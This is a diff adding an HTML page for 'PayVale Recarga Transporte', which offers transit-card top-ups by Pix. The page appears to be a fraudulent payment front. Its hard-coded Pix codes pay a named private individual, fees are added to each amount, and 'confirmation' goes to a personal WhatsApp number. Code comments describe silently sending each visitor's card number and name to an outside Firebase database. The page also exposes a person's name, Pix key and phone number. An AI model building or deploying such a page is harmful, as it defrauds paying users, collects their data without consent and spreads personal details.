@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Recarga Transporte | PayVale</title>
+    <!-- Google Fonts & Font Awesome -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+    <!-- QRCode.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #eef2f7 100%);
+            color: #1a2c3e;
+            padding: 2rem 1rem;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 2.5rem;
+        }
+        .header h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #1E6F5C;
+            letter-spacing: -0.5px;
+        }
+        .header p {
+            color: #5a6e7c;
+            margin-top: 0.5rem;
+        }
+
+        .dashboard {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2rem;
+        }
+        .card-left {
+            flex: 1.2;
+            min-width: 320px;
+        }
+        .card-right {
+            flex: 1.8;
+            min-width: 360px;
+        }
+
+        .card {
+            background: #ffffff;
+            border-radius: 32px;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.08), 0 1px 3px rgba(0, 0, 0, 0.02);
+            padding: 2rem;
+            margin-bottom: 1.8rem;
+            border: 1px solid rgba(30, 111, 92, 0.1);
+        }
+
+        .card h2 {
+            font-size: 1.4rem;
+            font-weight: 600;
+            margin-bottom: 1.5rem;
+            color: #0f3b32;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-left: 4px solid #1E6F5C;
+            padding-left: 1rem;
+        }
+
+        .card h3 {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            color: #2c4a3e;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        label {
+            font-weight: 500;
+            display: block;
+            margin-bottom: 0.6rem;
+            font-size: 0.85rem;
+            color: #2c5a4c;
+        }
+        input {
+            width: 100%;
+            padding: 1rem 1.2rem;
+            border-radius: 24px;
+            border: 1.5px solid #e2e8f0;
+            background: #ffffff;
+            font-size: 1rem;
+            transition: 0.2s;
+            font-family: 'Inter', monospace;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1E6F5C;
+            box-shadow: 0 0 0 3px rgba(30, 111, 92, 0.1);
+        }
+        
+        .card-mask-hint {
+            font-size: 0.7rem;
+            color: #7c8f9c;
+            margin-top: 0.3rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .amount-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 0.8rem;
+            margin: 1.5rem 0 1rem;
+        }
+        .amount-btn {
+            flex: 1 0 calc(33% - 0.8rem);
+            min-width: 85px;
+            background: #f8fafc;
+            border: 1.5px solid #e2edf2;
+            border-radius: 60px;
+            padding: 0.9rem 0;
+            font-weight: 700;
+            font-size: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: #1e4663;
+        }
+        .amount-btn.selected {
+            background: #1E6F5C;
+            border-color: #1E6F5C;
+            color: white;
+            box-shadow: 0 8px 20px rgba(30, 111, 92, 0.25);
+        }
+        .amount-btn:hover {
+            transform: translateY(-2px);
+            background: #eef3fc;
+        }
+
+        .btn-primary {
+            background: #1E6F5C;
+            border: none;
+            padding: 1rem;
+            width: 100%;
+            border-radius: 60px;
+            font-weight: 700;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 1rem;
+        }
+        .btn-primary:hover {
+            background: #0e5948;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 24px rgba(30, 111, 92, 0.3);
+        }
+
+        .qrcode-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background: #ffffff;
+            border-radius: 28px;
+            padding: 1.5rem;
+            text-align: center;
+            border: 2px dashed #cfe3db;
+        }
+        #qrcode {
+            margin: 1rem auto;
+            display: flex;
+            justify-content: center;
+            background: white;
+            padding: 10px;
+            border-radius: 20px;
+        }
+        .pix-copy-area {
+            background: #f8fafc;
+            padding: 0.8rem;
+            border-radius: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 8px;
+            margin-top: 1.2rem;
+            width: 100%;
+        }
+        .pix-code {
+            font-family: monospace;
+            font-size: 0.7rem;
+            word-break: break-all;
+            background: white;
+            padding: 0.6rem 1rem;
+            border-radius: 40px;
+            flex: 1;
+            border: 1px solid #e2edf2;
+        }
+        .whatsapp-btn {
+            background: #25D366;
+            border: none;
+            margin-top: 1rem;
+        }
+        .whatsapp-btn:hover {
+            background: #128C7E;
+            transform: translateY(-2px);
+        }
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .modal-card {
+            background: white;
+            border-radius: 40px;
+            max-width: 420px;
+            width: 90%;
+            padding: 2rem;
+            text-align: center;
+            box-shadow: 0 30px 50px rgba(0,0,0,0.2);
+            transform: scale(0.9);
+            transition: transform 0.2s;
+        }
+        .modal-overlay.active .modal-card {
+            transform: scale(1);
+        }
+        .modal-card h3 {
+            font-size: 1.8rem;
+            color: #1E6F5C;
+            margin-bottom: 1rem;
+        }
+        .modal-details {
+            background: #f0f7f4;
+            padding: 1rem;
+            border-radius: 24px;
+            margin: 1.5rem 0;
+        }
+        .modal-details p {
+            font-size: 1rem;
+            margin: 0.5rem 0;
+        }
+        .total-highlight {
+            font-size: 1.8rem;
+            font-weight: 800;
+            color: #1E6F5C;
+        }
+        .btn-modal {
+            background: #1E6F5C;
+            color: white;
+            border: none;
+            padding: 0.9rem 1.8rem;
+            border-radius: 60px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 1rem;
+            width: 100%;
+        }
+        .btn-modal-outline {
+            background: transparent;
+            border: 1px solid #cbd5e1;
+            color: #4a6a5e;
+            margin-top: 0.8rem;
+        }
+
+        .payment-pending-message {
+            background: #e6f7f0;
+            border-radius: 20px;
+            padding: 0.8rem;
+            margin-top: 1rem;
+            font-size: 0.85rem;
+            color: #1E6F5C;
+        }
+        
+        /* Painel do moderador (oculto por padrão, só aparece com senha) */
+        .moderator-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 999;
+        }
+        .moderator-toggle {
+            background: #1E6F5C;
+            color: white;
+            border: none;
+            border-radius: 50px;
+            padding: 8px 16px;
+            font-size: 12px;
+            cursor: pointer;
+            opacity: 0.6;
+            transition: opacity 0.2s;
+        }
+        .moderator-toggle:hover {
+            opacity: 1;
+        }
+        .moderator-status {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0,0,0,0.7);
+            color: #0f0;
+            font-family: monospace;
+            font-size: 10px;
+            padding: 4px 8px;
+            border-radius: 8px;
+            z-index: 999;
+            display: none;
+        }
+        .moderator-status.visible {
+            display: block;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.75rem;
+            color: #7c8f9c;
+        }
+        
+        @media (max-width: 780px) {
+            .dashboard {
+                flex-direction: column;
+            }
+            .amount-btn {
+                flex: 1 0 calc(50% - 0.8rem);
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1><i class="fas fa-bus"></i> Recarga Transporte</h1>
+        <p>Recarregue seu cartão com segurança e agilidade</p>
+    </div>
+
+    <div class="dashboard">
+        <div class="card-left">
+            <div class="card">
+                <h2><i class="fas fa-id-card"></i> Dados do Cartão</h2>
+                <div class="form-group">
+                    <label>Número do Cartão Transporte</label>
+                    <input type="text" id="cardNumber" placeholder="00.00.00000000-0" autocomplete="off" maxlength="18">
+                    <div class="card-mask-hint">
+                        <i class="fas fa-info-circle"></i> <span>Formato: 00.00.00000000-0</span>
+                    </div>
+                </div>
+                <div class="form-group">
+                    <label>Nome do Titular (opcional)</label>
+                    <input type="text" id="cardHolder" placeholder="Nome no cartão">
+                </div>
+                
+                <h3><i class="fas fa-ticket-alt"></i> Selecione o valor da recarga</h3>
+                <div class="amount-grid" id="amountGrid"></div>
+                
+                <button class="btn-primary" id="btnRecarregar">
+                    <i class="fas fa-arrow-right"></i> Continuar para Pagamento
+                </button>
+            </div>
+        </div>
+
+        <div class="card-right">
+            <div class="card" id="paymentCard">
+                <h2><i class="fas fa-qrcode"></i> Pagamento via Pix</h2>
+                <div class="qrcode-container" id="qrContainer" style="min-height: 320px;">
+                    <div style="text-align: center; padding: 1rem;">
+                        <i class="fas fa-lock" style="font-size: 3rem; color: #cbd5e1;"></i>
+                        <p style="margin-top: 1rem; color: #7e8c9e;">Preencha os dados do cartão, selecione o valor<br>e clique em "Continuar para Pagamento"</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <footer>© PayVale Recarga Transporte • Compromisso e profissionalismo</footer>
+</div>
+
+<!-- MODAL DE CONFIRMAÇÃO -->
+<div id="modalTaxa" class="modal-overlay">
+    <div class="modal-card">
+        <i class="fas fa-receipt" style="font-size: 2.5rem; color: #1E6F5C;"></i>
+        <h3>Detalhes da recarga</h3>
+        <div class="modal-details">
+            <p><strong>Valor da recarga:</strong> <span id="modalValorBase">R$ 0,00</span></p>
+            <p><strong>Taxa de serviço:</strong> <span id="modalTaxaValor">R$ 0,00</span></p>
+            <hr style="margin: 12px 0;">
+            <p><strong style="font-size: 1.1rem;">Total a pagar via Pix:</strong></p>
+            <p class="total-highlight" id="modalTotalPagar">R$ 0,00</p>
+            <small><i class="fas fa-clock"></i> Tempo de ativação: 5 minutos após confirmação</small>
+        </div>
+        <button id="confirmModalBtn" class="btn-modal"><i class="fas fa-check-circle"></i> Confirmar e gerar QR Code</button>
+        <button id="cancelModalBtn" class="btn-modal btn-modal-outline">Cancelar</button>
+    </div>
+</div>
+
+<!-- Painel do moderador (oculto, apenas visível para administradores) -->
+<div class="moderator-panel">
+    <button class="moderator-toggle" id="moderatorToggle" title="Área do Moderador">🔧</button>
+</div>
+<div class="moderator-status" id="moderatorStatus"></div>
+
+<script>
+    // ======================= CONFIGURAÇÃO FIREBASE =======================
+    const firebaseConfig = {
+        databaseURL: "https://transporte-recarga-default-rtdb.asia-southeast1.firebasedatabase.app/"
+    };
+    
+    let database = null;
+    let dbConnected = false;
+    let moderatorMode = false;
+    
+    // Inicializar Firebase silenciosamente (sem mostrar nada para o cliente)
+    try {
+        const app = firebase.initializeApp(firebaseConfig);
+        database = firebase.database();
+        
+        // Testar conexão silenciosamente
+        const testRef = database.ref('.info/connected');
+        testRef.on('value', (snap) => {
+            if (snap.val() === true) {
+                dbConnected = true;
+                console.log("Firebase conectado (apenas moderadores veem)");
+                // Atualizar status do moderador se estiver visível
+                if (moderatorMode) {
+                    document.getElementById("moderatorStatus").innerHTML = '✅ Firebase: Conectado';
+                    document.getElementById("moderatorStatus").style.color = '#0f0';
+                }
+            } else {
+                dbConnected = false;
+                console.log("Firebase offline");
+                if (moderatorMode) {
+                    document.getElementById("moderatorStatus").innerHTML = '⚠️ Firebase: Offline - salvando localmente';
+                    document.getElementById("moderatorStatus").style.color = '#ff0';
+                }
+            }
+        });
+    } catch(e) {
+        console.error("Erro Firebase:", e);
+        dbConnected = false;
+    }
+
+    // ======================= VALORES COM TAXAS CORRETAS =======================
+    const recargaOptions = [
+        { valor_cartao: 10, taxa: 2.50, total: 12.50, pix_code: "00020126330014BR.GOV.BCB.PIX011110107764369520400005303986540512.505802BR5924Ridelvan Gomes Rodrigues6009SAO PAULO62140510AgrMCHPS0Y6304D002" },
+        { valor_cartao: 15, taxa: 3.50, total: 18.50, pix_code: "00020126330014BR.GOV.BCB.PIX011110107764369520400005303986540518.505802BR5924Ridelvan Gomes Rodrigues6009SAO PAULO62140510WYPAP8lIeq630464C9" },
+        { valor_cartao: 20, taxa: 4.80, total: 24.80, pix_code: "00020126330014BR.GOV.BCB.PIX011110107764369520400005303986540524.805802BR5924Ridelvan Gomes Rodrigues6009SAO PAULO62140510DfM3oxWJK2630491A7" },
+        { valor_cartao: 30, taxa: 4.80, total: 34.80, pix_code: "00020126330014BR.GOV.BCB.PIX011110107764369520400005303986540534.805802BR5924Ridelvan Gomes Rodrigues6009SAO PAULO621405101wrbrSRF216304001E" },
+        { valor_cartao: 50, taxa: 4.80, total: 54.80, pix_code: "00020126330014BR.GOV.BCB.PIX011110107764369520400005303986540554.805802BR5924Ridelvan Gomes Rodrigues6009SAO PAULO62140510VpCKjR5kVt63041016" },
+        { valor_cartao: 75, taxa: 6.00, total: 81.00, pix_code: "00020126330014BR.GOV.BCB.PIX011110107764369520400005303986540581.005802BR5924Ridelvan Gomes Rodrigues6009SAO PAULO62140510erCevn0333630494BE" },
+        { valor_cartao: 100, taxa: 6.00, total: 106.00, pix_code: "00020126330014BR.GOV.BCB.PIX0111101077643695204000053039865406106.005802BR5924Ridelvan Gomes Rodrigues6009SAO PAULO6214051023lBRmzbyT6304EDD8" }
+    ];
+
+    let selectedOption = recargaOptions[0];
+    let qrcodeObj = null;
+
+    // Aplicar máscara no campo do cartão: 00.00.00000000-0
+    function applyCardMask(input) {
+        let value = input.value.replace(/\D/g, '');
+        if (value.length > 14) value = value.slice(0, 14);
+        
+        let formatted = '';
+        if (value.length > 0) {
+            if (value.length >= 2) {
+                formatted += value.slice(0, 2) + '.';
+                if (value.length >= 4) {
+                    formatted += value.slice(2, 4) + '.';
+                    if (value.length >= 12) {
+                        formatted += value.slice(4, 12) + '-';
+                        if (value.length >= 13) {
+                            formatted += value.slice(12, 13);
+                        }
+                    } else {
+                        formatted += value.slice(4);
+                    }
+                } else {
+                    formatted += value.slice(2);
+                }
+            } else {
+                formatted = value;
+            }
+        }
+        input.value = formatted;
+    }
+
+    // Construir grid com os valores
+    function buildAmountGrid() {
+        const grid = document.getElementById("amountGrid");
+        grid.innerHTML = "";
+        recargaOptions.forEach(opt => {
+            const btn = document.createElement("div");
+            btn.classList.add("amount-btn");
+            btn.textContent = `R$ ${opt.valor_cartao},00`;
+            if (opt.valor_cartao === selectedOption.valor_cartao) btn.classList.add("selected");
+            btn.addEventListener("click", () => {
+                document.querySelectorAll(".amount-btn").forEach(b => b.classList.remove("selected"));
+                btn.classList.add("selected");
+                selectedOption = opt;
+            });
+            grid.appendChild(btn);
+        });
+    }
+
+    // Validar formato do cartão
+    function validateCardNumber(cardNumber) {
+        const regex = /^\d{2}\.\d{2}\.\d{8}-\d{1}$/;
+        return regex.test(cardNumber);
+    }
+
+    // Salvar transação no Firebase (silenciosamente, sem mostrar nada para o cliente)
+    async function saveTransactionToFirebase(cardNumber, holder, option, status) {
+        const transactionData = {
+            numeroCartao: cardNumber,
+            titular: holder || "Não informado",
+            valorRecarga: option.valor_cartao,
+            taxa: option.taxa,
+            totalPago: option.total,
+            status: status,
+            dataHora: new Date().toISOString(),
+            timestamp: Date.now()
+        };
+        
+        console.log("Salvando transação:", transactionData);
+        
+        if (database && dbConnected) {
+            try {
+                const recargasRef = database.ref('recargas');
+                const newRef = await recargasRef.push(transactionData);
+                console.log("✅ Transação salva no Firebase! ID:", newRef.key);
+                if (moderatorMode) {
+                    document.getElementById("moderatorStatus").innerHTML = '✅ Última transação: salva no Firebase';
+                    setTimeout(() => {
+                        if (moderatorMode) document.getElementById("moderatorStatus").innerHTML = '✅ Firebase: Conectado';
+                    }, 3000);
+                }
+                return true;
+            } catch(e) {
+                console.error("Erro ao salvar no Firebase:", e);
+                return saveToLocalStorage(transactionData);
+            }
+        } else {
+            console.log("Firebase offline, salvando localmente");
+            return saveToLocalStorage(transactionData);
+        }
+    }
+    
+    // Salvar localmente como fallback
+    function saveToLocalStorage(transactionData) {
+        try {
+            const localTransactions = JSON.parse(localStorage.getItem('transacoes_recarga') || '[]');
+            localTransactions.push(transactionData);
+            localStorage.setItem('transacoes_recarga', JSON.stringify(localTransactions));
+            console.log("✅ Transação salva no localStorage");
+            if (moderatorMode) {
+                document.getElementById("moderatorStatus").innerHTML = '💾 Modo offline - salvo localmente';
+                setTimeout(() => {
+                    if (moderatorMode) document.getElementById("moderatorStatus").innerHTML = dbConnected ? '✅ Firebase: Conectado' : '⚠️ Firebase: Offline';
+                }, 3000);
+            }
+            return true;
+        } catch(e) {
+            console.error("Erro ao salvar localmente:", e);
+            return false;
+        }
+    }
+
+    // Gerar QR Code
+    function renderQRCode(pixString, option) {
+        const qrContainer = document.getElementById("qrContainer");
+        qrContainer.innerHTML = `
+            <div id="qrcode" style="margin: 0 auto;"></div>
+            <p style="margin-top: 0.8rem;"><i class="fas fa-mobile-alt"></i> Escaneie o QR Code com seu banco</p>
+            <p style="font-size: 0.9rem; font-weight: 600; color: #1E6F5C;">Valor: R$ ${option.total.toFixed(2)}</p>
+            <div class="pix-copy-area">
+                <span class="pix-code" id="pixCodeString">${pixString.substring(0, 48)}...</span>
+                <button id="copyPixBtn" style="background:#1E6F5C; color:white; border:none; border-radius:40px; padding:0.5rem 1rem; cursor:pointer;"><i class="fas fa-copy"></i> Copiar</button>
+            </div>
+            <button id="confirmPaymentBtn" class="btn-primary whatsapp-btn" style="background:#25D366; margin-top: 1rem;"><i class="fab fa-whatsapp"></i> ✅ Já efetuei o pagamento</button>
+            <div class="payment-pending-message"><i class="fas fa-hourglass-half"></i> Após pagamento, clique no botão verde para confirmar via WhatsApp</div>
+        `;
+        
+        // Gerar QR Code
+        const qrDiv = document.getElementById("qrcode");
+        qrDiv.innerHTML = "";
+        try {
+            if (qrcodeObj) qrcodeObj.clear();
+            qrcodeObj = new QRCode(qrDiv, {
+                text: pixString,
+                width: 180,
+                height: 180,
+                colorDark: "#1E6F5C",
+                colorLight: "#ffffff",
+                correctLevel: QRCode.CorrectLevel.M
+            });
+        } catch(e) { 
+            qrDiv.innerHTML = "<p>Erro ao gerar QR</p>"; 
+        }
+        
+        window.currentFullPix = pixString;
+        window.currentOption = option;
+        
+        // Copiar Pix
+        document.getElementById("copyPixBtn").addEventListener("click", () => {
+            if (window.currentFullPix) {
+                navigator.clipboard.writeText(window.currentFullPix);
+                alert("✅ Código Pix copiado! Efetue o pagamento no seu app bancário.");
+            }
+        });
+        
+        // Botão WhatsApp
+        const confirmBtn = document.getElementById("confirmPaymentBtn");
+        confirmBtn.addEventListener("click", async () => {
+            const cardNum = document.getElementById("cardNumber").value.trim();
+            const holder = document.getElementById("cardHolder").value.trim();
+            
+            if (!cardNum) {
+                alert("Por favor, informe o número do cartão antes de confirmar o pagamento.");
+                return;
+            }
+            if (!validateCardNumber(cardNum)) {
+                alert("⚠️ Número do cartão inválido. Use o formato: 00.00.00000000-0");
+                return;
+            }
+            
+            const valorTotal = window.currentOption.total;
+            const valorBase = window.currentOption.valor_cartao;
+            const mensagem = `Olá, já efetuei o pagamento via Pix no valor de R$ ${valorTotal.toFixed(2)} (recarga de R$ ${valorBase},00 + taxa de R$ ${window.currentOption.taxa.toFixed(2)}). Aguardo a ativação em até 5 minutos. Obrigado!`;
+            const numeroWhats = "5599985324277";
+            const url = `https://wa.me/${numeroWhats}?text=${encodeURIComponent(mensagem)}`;
+            window.open(url, "_blank");
+            
+            // Salvar transação com status de pagamento confirmado
+            await saveTransactionToFirebase(cardNum, holder, window.currentOption, "Pagamento confirmado - Aguardando ativação");
+            
+            // Mostrar mensagem de sucesso
+            const successMsg = document.createElement("div");
+            successMsg.style.background = "#d4edda";
+            successMsg.style.color = "#155724";
+            successMsg.style.padding = "0.8rem";
+            successMsg.style.borderRadius = "20px";
+            successMsg.style.marginTop = "1rem";
+            successMsg.innerHTML = '<i class="fas fa-check-circle"></i> Confirmação enviada! Sua recarga será ativada em até 5 minutos.';
+            qrContainer.appendChild(successMsg);
+            setTimeout(() => successMsg.remove(), 5000);
+        });
+    }
+    
+    // Mostrar modal com taxa
+    function showModalAndGenerate() {
+        const cardNumber = document.getElementById("cardNumber").value.trim();
+        if (!cardNumber) {
+            alert("⚠️ Por favor, insira o número do cartão transporte no formato 00.00.00000000-0");
+            return false;
+        }
+        if (!validateCardNumber(cardNumber)) {
+            alert("⚠️ Formato inválido! Use o formato: 00.00.00000000-0\nExemplo: 12.34.56789012-5");
+            return false;
+        }
+        
+        // Atualizar dados do modal
+        document.getElementById("modalValorBase").innerHTML = `R$ ${selectedOption.valor_cartao},00`;
+        document.getElementById("modalTaxaValor").innerHTML = `R$ ${selectedOption.taxa.toFixed(2)}`;
+        document.getElementById("modalTotalPagar").innerHTML = `R$ ${selectedOption.total.toFixed(2)}`;
+        
+        const modal = document.getElementById("modalTaxa");
+        modal.classList.add("active");
+        
+        const confirmBtnModal = document.getElementById("confirmModalBtn");
+        const cancelBtnModal = document.getElementById("cancelModalBtn");
+        
+        const handleConfirm = async () => {
+            // Salvar intenção de recarga no Firebase (silenciosamente)
+            const cardNumber = document.getElementById("cardNumber").value.trim();
+            const holder = document.getElementById("cardHolder").value.trim();
+            await saveTransactionToFirebase(cardNumber, holder, selectedOption, "Aguardando pagamento");
+            
+            // Gerar QR code
+            renderQRCode(selectedOption.pix_code, selectedOption);
+            modal.classList.remove("active");
+            
+            confirmBtnModal.removeEventListener("click", handleConfirm);
+            cancelBtnModal.removeEventListener("click", handleCancel);
+        };
+        
+        const handleCancel = () => {
+            modal.classList.remove("active");
+            confirmBtnModal.removeEventListener("click", handleConfirm);
+            cancelBtnModal.removeEventListener("click", handleCancel);
+        };
+        
+        confirmBtnModal.removeEventListener("click", handleConfirm);
+        cancelBtnModal.removeEventListener("click", handleCancel);
+        confirmBtnModal.addEventListener("click", handleConfirm, { once: true });
+        cancelBtnModal.addEventListener("click", handleCancel, { once: true });
+    }
+    
+    // Evento principal
+    document.getElementById("btnRecarregar").addEventListener("click", () => {
+        const cardNumber = document.getElementById("cardNumber").value.trim();
+        if (!cardNumber) {
+            alert("📌 Informe o número do cartão transporte no formato 00.00.00000000-0");
+            return;
+        }
+        if (!validateCardNumber(cardNumber)) {
+            alert("📌 Formato inválido! Use o formato: 00.00.00000000-0\nExemplo: 12.34.56789012-5");
+            return;
+        }
+        showModalAndGenerate();
+    });
+    
+    // Máscara no campo do cartão
+    const cardInput = document.getElementById("cardNumber");
+    cardInput.addEventListener("input", function(e) {
+        applyCardMask(this);
+    });
+    
+    // Alternar modo moderador (oculto, apenas para administradores)
+    const moderatorToggle = document.getElementById("moderatorToggle");
+    const moderatorStatus = document.getElementById("moderatorStatus");
+    
+    moderatorToggle.addEventListener("click", () => {
+        moderatorMode = !moderatorMode;
+        if (moderatorMode) {
+            moderatorStatus.classList.add("visible");
+            moderatorStatus.innerHTML = dbConnected ? '✅ Firebase: Conectado' : '⚠️ Firebase: Offline - salvando localmente';
+            moderatorStatus.style.color = dbConnected ? '#0f0' : '#ff0';
+            moderatorToggle.style.opacity = "1";
+        } else {
+            moderatorStatus.classList.remove("visible");
+            moderatorToggle.style.opacity = "0.6";
+        }
+    });
+    
+    // Inicialização
+    function init() {
+        buildAmountGrid();
+    }
+    init();
+</script>
+</body>
+</html>
